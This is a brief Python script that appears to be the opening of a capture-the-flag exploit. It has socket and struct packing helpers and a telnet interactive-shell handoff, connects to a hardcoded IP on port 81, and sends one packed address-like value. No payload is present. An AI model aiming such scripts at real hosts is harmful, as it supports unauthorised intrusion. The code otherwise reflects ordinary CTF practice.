import socket
import time
import os
import struct
import telnetlib

def connect(ip, port):
    return socket.create_connection((ip, port))

def p(x):
    return struct.pack('<I', x)

def u(x):
    return struct.unpack('<I', x)[0]

def interact(s):
    print('----- interactive mode -----')
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


s = connect('52.197.128.90', 81)

print(s.recv(1024).decode('utf-8'))
time.sleep(0.1)
s.send(p(0xbe510000))
time.sleep(0.1)
print(s.recv(1024).decode('utf-8'))
time.sleep(0.1)

